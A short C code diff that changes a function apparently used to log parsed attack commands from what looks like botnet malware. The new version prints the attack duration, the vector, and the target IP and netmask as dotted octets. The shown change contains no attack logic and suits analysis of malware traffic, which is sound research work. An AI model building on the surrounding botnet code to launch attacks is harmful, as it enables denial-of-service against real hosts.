@@ -107,10 +107,13 @@ void attack_parse(char *buf, int len)
 
 void attack_analysis(int duration, ATTACK_VECTOR vector, uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
 {
-   
+    int i, a[4];
     printf("[analysis] duration: %d\n", duration);
     printf("[analysis] attack vector: %d\n", vector);
-    printf("[analysis] attack target ip: %s  netmask: %d\n", targs->addr, targs->netmask);
+    for(i = 0; i<4; ++i){
+        a[i] = (targs->addr >> (i*8)) & 0xFF;
+    }
+    printf("[analysis] attack target ip: %u.%u.%u.%u netmask: %u\n", a[3], a[2], a[1], a[0], targs->netmask);
 
 }
 
